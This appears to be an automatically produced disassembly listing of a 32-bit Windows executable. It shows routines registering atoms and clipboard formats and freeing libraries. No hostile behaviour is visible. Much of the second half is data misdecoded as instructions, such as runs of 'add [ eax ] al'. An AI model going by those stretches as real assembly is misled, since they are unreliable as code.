mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x6 ] 0x0
mov al [ ebp - 0x5 ]
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov [ ebp - 0x6 ] al
jmp r-xdata
mov al [ ebp - 0x6 ]
pop ecx
pop ecx
pop ebp
retn
sub_439d74
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x5 ] 0x3
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_439d3c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_439d3c
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
mov al [ ebp - 0x5 ]
dec al
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
push 0x1
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
mov eax [ ebp - 0x10 ]
and eax 0xfffffff4
xor edx edx
mov dl [ ebp - 0x5 ]
movzx edx [ edx + rw-data ]
or eax edx
mov [ ebp - 0x10 ] eax
sub_439e70
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov [ ebp - 0x5 ] al
jmp r-xdata
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_439e9c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44c070
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44c070
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_44c070
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_44c070
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_439f10
push ebp
mov ebp esp
add esp 0xffffffc8
push 0x0
call GetCurrentProcessId
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0x0
lea ecx [ ebp - 0x28 ]
mov edx r-xdata
lea eax [ ebp - 0x20 ]
call sub_446f20
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
push 0x1
mov eax [ rw-data ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x38 ]
mov edx r-xdata
lea eax [ ebp - 0x20 ]
call sub_446f20
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c874
mov [ rw-data ] eax
call sub_439ad0
mov dl 0x1
mov eax [ r-xdata ]
call sub_439874
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_422458
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_423868
mov edx [ rw-data ]
mov [ edx ] eax
call sub_41a3cc
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_425660
mov ecx r-xdata
mov edx sub_4290d0
mov eax [ r-xdata ]
call sub_43bd6c
mov esp ebp
pop ebp
retn
sub_43a013
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43a05f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a066
retn
mov eax [ rw-data ]
call sub_44c070
call sub_439e9c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_44d340
sub_43a08c
mov esp 0xf0004735
inc [ eax ]
add [ ebp + esi - 0xeffb9 ] bh
add [ eax ] al
mov esp 0xf2004735
inc [ eax ]
add [ ebp + esi - 0xcffb9 ] bh
add [ eax ] al
mov esp 0xf4004735
inc [ eax ]
add [ ebp + esi - 0xaffb9 ] bh
add [ eax ] al
mov esp 0xf6004735
inc [ eax ]
add [ ebp + esi - 0x8ffb9 ] bh
add [ eax ] al
mov esp 0xf8004735
inc [ eax ]
add [ ebp + esi - 0x6ffb9 ] bh
add [ eax ] al
mov esp 0xfa004735
inc [ eax ]
add [ ebp + esi - 0x4ffb9 ] bh
add [ eax ] al
mov esp 0xfc004735
inc [ eax ]
add [ ebp + esi - 0x2ffb9 ] bh
add [ eax ] al
mov esp 0xfe004735
inc [ eax ]
add [ ebp + esi - 0xffb9 ] bh
add [ eax ] al
mov esp 0xe0004735
inc [ eax ]
add [ ebp + esi - 0x1effb9 ] bh
add [ eax ] al
mov esp 0xe2004735
inc [ eax ]
add [ ebp + esi - 0x1cffb9 ] bh
add [ eax ] al
mov esp 0xe4004735
inc [ eax ]
add [ ebp + esi - 0x1affb9 ] bh
add [ eax ] al
mov esp 0xe6004735
inc [ eax ]
add [ ebp + esi - 0x18ffb9 ] bh
add [ eax ] al
mov esp 0xe8004735
inc [ eax ]
add [ ebp + esi - 0x16ffb9 ] bh
add [ eax ] al
mov esp 0xea004735
inc [ eax ]
add [ ebp + esi - 0x14ffb9 ] bh
add [ eax ] al
mov esp 0xec004735
inc [ eax ]
add [ ebp + esi - 0x12ffb9 ] bh
add [ eax ] al
mov esp 0xee004735
inc [ eax ]
add [ ebp + esi - 0x10ffb9 ] bh
add [ eax ] al
mov esp 0xd0004735
inc [ eax ]
add [ ebp + esi - 0x2effb9 ] bh
add [ eax ] al
mov esp 0xd2004735
inc [ eax ]
add [ ebp + esi - 0x2cffb9 ] bh
add [ eax ] al
mov esp 0xd4004735
inc [ eax ]
add [ ebp + esi - 0x2affb9 ] bh
add [ eax ] al
mov esp 0xd6004735
inc [ eax ]
add [ ebp + esi - 0x28ffb9 ] bh
add [ eax ] al
mov esp 0xd8004735
inc [ eax ]
add [ ebp + esi - 0x26ffb9 ] bh
add [ eax ] al
mov esp 0xda004735
inc [ eax ]
add [ ebp + esi - 0x24ffb9 ] bh
add [ eax ] al
mov esp 0xdc004735
inc [ eax ]
add [ ebp + esi - 0x22ffb9 ] bh
add [ eax ] al
mov esp 0xde004735
inc [ eax ]
add [ ebp + esi - 0x20ffb9 ] bh
add [ eax ] al
mov esp 0xc0004735
inc [ eax ]
add [ ebp + esi - 0x3effb9 ] bh
add [ eax ] al
mov esp 0xc2004735
inc [ eax ]
add [ ebp + esi - 0x3cffb9 ] bh
add [ eax ] al
mov esp 0xc4004735
inc [ eax ]
add [ ebp + esi - 0x3affb9 ] bh
add [ eax ] al
mov esp 0xc6004735
inc [ eax ]
add [ ebp + esi - 0x38ffb9 ] bh
add [ eax ] al
mov esp 0xc8004735
inc [ eax ]
add [ ebp + esi - 0x36ffb9 ] bh
add [ eax ] al
mov esp 0xca004735
inc [ eax ]
add [ ebp + esi - 0x34ffb9 ] bh
add [ eax ] al
mov esp 0xcc004735
inc [ eax ]
add [ ebp + esi - 0x32ffb9 ] bh
add [ eax ] al
mov esp 0xce004735
inc [ eax ]
add [ ebp + esi - 0x30ffb9 ] bh
add [ eax ] al
mov esp 0xb0004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xb2004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xb4004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xb6004735
inc [ eax ]
add [ ebp + esi - r--data ] bh
add [ eax ] al
mov esp 0xb8004735
inc [ eax ]
add [ ebp + esi - rw-data ] bh
add [ eax ] al
mov esp 0xba004735
inc [ eax ]
add [ ebp + esi - r-xdata ] bh
add [ eax ] al
mov esp 0xbc004735
inc [ eax ]
add [ ebp + esi - r-xdata ] bh
add [ eax ] al
mov esp 0xbe004735
inc [ eax ]
add [ ebp + esi - r-xdata ] bh
add [ eax ] al
mov esp 0xa0004735
inc [ eax ]
add [ ebp + esi - 0x5effb9 ] bh
add [ eax ] al
mov esp 0xa2004735
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43a349
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a350
retn
sub_43a35c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a38d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a394
retn
mov eax [ rw-data ]
call sub_44c070
sub_43a398
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jae r-xdata
pop ebp
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_43a3f1
add [ eax ] al
add al bh
mov [ 0xb030043 ] eax
push esp
inc esp
jne r-xdata
lodsd [ esi ]
inc ebx
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
insb
imul esp [ ebx + 0x61 ] 0x1736574
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
hlt
jae r-xdata
jae r-xdata
add [ gs : eax ] eax
jae r-xdata
add [ eax - 0x5b776f70 ] dl
inc ebx
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
js r-xdata
outsd
push edx
imul esp [ edi + 0x68 ] 0x64620d74
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax + 0x43a4fc90 ] dl
add [ edi ] al
or al 0x54
inc edx
popad
jae r-xdata
cld
outsb
dec ecx
je r-xdata
add [ eax ] ecx
add al 0x1
add [ eax ] al
cmp bh 0xff
sbb [ edx + 0x64 ] ah
push edx
bound esp [ edx + edx * 2 + 0x69 ]
push 0x4c6f5474
je r-xdata
inc ebx
add [ 0x654c6462 ] cl
add eax [ eax ]
add [ eax ] al
pop eax
arpl [ ecx + 0x63 ] ax
je r-xdata
movsb [ edi ] [ esi ]
inc ebx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xor [ ebp + 0x44 ] dl
add [ eax ] al
nop
nop
nop
lodsb [ esi ]
movsb [ edi ] [ esi ]
inc ebx
add [ 0x7453540f ] cl
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
lodsb [ esi ]
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx ] al
or [ esi ] al
popad
imul ebp [ fs : esi + 0x67 ] 0x796c6e4f
nop
nop
les esp [ ebp + 0xc010043 ]
push esp
dec eax
insb
jo r-xdata
add [ eax ] al
add bh bh
inc [ eax ]
add al bh
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] cl
or al 0x54
dec esi
outsd
je r-xdata
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
outsd
inc ecx
insb
imul esp [ edi + 0x6e ] 0x52646218
movsd [ edi ] [ esi ]
outsd
outsb
sbb al 0xb7
inc ebx
add ah ch
mov ch 0x43
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
nop
nop
and al 0xa5
inc ebx
outsb
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
sbb al 0xa6
inc ebx
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
jo r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx - 0x5a ] si
jb r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
pop eax
push ebp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + eax ] cl
jns r-xdata
je r-xdata
jae r-xdata
je r-xdata
popad
jo r-xdata
add [ esi ] cl
push cs
push esp
dec ecx
outsb
je r-xdata
add [ eax + 0x43a52490 ] dl
insd
dec esp
imul esi [ ebx + 0x74 ] 0x40000000
add [ eax ] al
add [ eax ] cl
test [ ebx + eax * 2 - 0x6f6f7000 ] ah
shl [ ebx + eax * 2 + 0x54100700 ] 0x1
inc edx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
jb r-xdata
insb
insb
dec eax
insb
jo r-xdata
nop
nop
or [ edi + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0xc0043 ] ah
add [ eax ] al
pushad
cmpsb [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ 0x72434645 ] cl
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc0043 ] ch
jbe r-xdata
outsd
jb r-xdata
or [ ebx + 0x61 ] al
jbe r-xdata
je r-xdata
bound esp [ esp + ecx * 2 + 0x65 ]
outsb
je r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x5b ] bl
add al 0x0
arpl [ ecx + 0x63 ] ax
je r-xdata
cmpsb [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
inc ebx
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xa8
outsd
jb r-xdata
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
outsb
je r-xdata
pushfd
retn 0x44
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
je r-xdata
jns r-xdata
movsd [ edi ] [ esi ]
inc ebx
add [ esi ] al
pop es
push esp
inc edx
imul esi [ ebx + edx * 2 + 0x65 ] 0xca780574
inc ebx
add [ eax + 0x43a55c90 ] dl
add [ ebx ] al
or [ edx + eax * 2 + 0x69 ] edx
inc esp
imul ecx [ ebp + 0x6f ] 0x16564
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
sbb al 0xa6
inc esp
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 4 ] dl
test al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
test al 0x43
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] ah
add [ eax + eax ] cl
add [ eax ] al
pushad
cmpsb [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0xc0043 ] bh
add [ eax ] al
pushad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc0043a7
add [ eax ] al
add [ eax - 0x5a ] ah
outsd
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
insd
popad
outsb
add al 0x57
add eax [ eax ]
pop es
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
add [ eax + eax * 8 ] al
pop es
dec ecx
outsb
je r-xdata
push ebx
outsb
jb r-xdata
add [ eax ] ecx
push es
add [ eax ] al
dec eax
xchg ebp eax
inc esp
add [ eax + eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
cmpsd [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
add al 0xc0
insb
test al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax * 2 + 0x65727453 ] cl
popad
add [ eax - 0x40 ] ah
nop
cmpsd [ fs : esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
rol [ eax + eax + 0xc ] 0x45
push ebx
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
cmpsd [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ebp
jb r-xdata
popad
inc ebx
popad
add [ eax + eax * 8 ] al
outsd
jne r-xdata
add [ eax ] al
inc ebp
jb r-xdata
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
add [ eax + 0x55 ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
inc ebx
inc esp
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
rol [ eax + eax + 0x18 ] 0xc0
outsd
jne r-xdata
inc esp
add [ eax - 0x40 ] ah
sbb al al
aam 0xa9
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
test eax 0xc0043
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xa9
inc ebx
add [ eax + eax ] cl
nop
nop
nop
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx + 0xc0043 ] ch
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
nop
and [ ecx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
pop eax
push ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
test eax 0xc0043
add [ eax + eax ] cl
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 + 0x43 ] bh
add [ eax ] al
add [ eax + ebp * 4 + 0x43 ] ch
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
test al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffbb3e ] ah
retn 0x44
add [ eax - 0x40 ] ah
inc esp
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
stosb [ edi ]
inc ebx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x56 ] dh
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add ah al
jpo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
inc esp
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
sub al 0xaa
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 4 ] ch
inc ebx
add [ eax + eax ] cl
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax ] dl
inc ebp
push ebx
je r-xdata
inc esp
add [ eax - 0x40 ] ah
nop
nop
mov [ edx + 0x43 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0xc0043 ] gs
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xab
inc ebx
add [ eax ] dl
add [ eax ] al
add al cl
movsd [ edi ] [ esi ]
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x38 ] 0xc2
inc ebx
add [ esp + eax * 8 - 0x379fffbd ] ch
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0xaba49090
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
or [ ebx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
lodsb [ esi ]
inc ebx
add [ eax + eax ] ah
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x100043 ] dh
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
add [ eax + eax ] cl
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ecx ] dl
inc ebp
dec ecx
outsb
jbe r-xdata
arpl [ ebp + 0x73 ] sp
inc esp
stosd [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x43 ] al
add [ edx + eax * 8 - 0x3c87ffbd ] bh
inc ebx
add [ 0x73694c54 ] al
je r-xdata
insb
rol [ eax + eax - 0x3c ] 0x7b
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
stosd [ edi ]
inc ebx
outsd
jb r-xdata
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
stosb [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
sub_43a6c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 4 ] dl
test al 0x43
add [ eax ] al
add [ eax ] al
